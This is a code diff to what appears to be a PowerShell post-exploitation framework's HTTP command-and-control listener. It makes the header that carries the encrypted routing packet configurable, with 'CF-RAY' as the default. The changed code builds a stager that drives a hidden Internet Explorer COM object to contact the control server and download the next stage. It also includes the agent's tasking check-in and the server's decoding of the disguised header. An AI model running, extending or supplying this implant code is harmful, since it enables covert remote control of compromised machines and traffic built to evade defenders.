@@ -26,8 +26,8 @@ class Listener:
 
             'Author': ['@harmj0y'],
 
-            'Description': ('Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach '
-                            'using a hidden Internet Explorer COM object.'),
+            'Description': ('Starts a http[s] listener (PowerShell only) that uses a GET/POST approach '
+                            'using a hidden Internet Explorer COM object. If using HTTPS, valid certificate required.'),
 
             'Category' : ('client_server'),
 
@@ -104,6 +104,11 @@ class Listener:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'RequestHeader' : {
+                'Description'   :   'Cannot use Cookie header, choose a different HTTP request header for comms.',
+                'Required'      :   True,
+                'Value'         :   'CF-RAY'
+            },
             'ServerVersion' : {
                 'Description'   :   'Server header for the control server.',
                 'Required'      :   True,
@@ -175,6 +180,7 @@ class Listener:
             launcher = listenerOptions['Launcher']['Value']
             stagingKey = listenerOptions['StagingKey']['Value']
             profile = listenerOptions['DefaultProfile']['Value']
+            requestHeader = listenerOptions['RequestHeader']['Value']
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
 
@@ -236,7 +242,7 @@ class Listener:
                 # add the RC4 packet to a header location
                 stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
                 stager += "$ser='%s';$t='%s';" % (host, stage0)
-                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,'CF-RAY: %s');"  % (b64RoutingPacket)
+                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,'%s: %s');"  % (requestHeader, b64RoutingPacket)
                 stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
                 stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
                 stager += "try {$data=[System.Convert]::FromBase64String($ht)} catch {$Null}"
@@ -410,7 +416,7 @@ class Listener:
                                 # meta 'TASKING_REQUEST' : 4
                                 $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
-                                $Headers = "CF-RAY: $RoutingCookie"
+                                $Headers = "%s: $RoutingCookie"
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
@@ -433,7 +439,7 @@ class Listener:
                             }
                         }
                     }
-                """
+                """ % (listenerOptions['RequestHeader']['Value'])
 
                 sendMessage = """
                     function script:Send-Message {
@@ -537,11 +543,11 @@ class Listener:
             clientIP = request.remote_addr
             dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/http_com')
             routingPacket = None
-            cfRay = request.headers.get('CF-RAY')
-            if cfRay and cfRay != '':
+            reqHeader = request.headers.get(listenerOptions['RequestHeader']['Value'])
+            if reqHeader and reqHeader != '':
                 try:
-                    # decode the routing packet base64 value from the cfRay header location
-                    routingPacket = base64.b64decode(cfRay)
+                    # decode the routing packet base64 value from the custom HTTP request header location
+                    routingPacket = base64.b64decode(reqHeader)
                 except Exception as e:
                     routingPacket = None
 
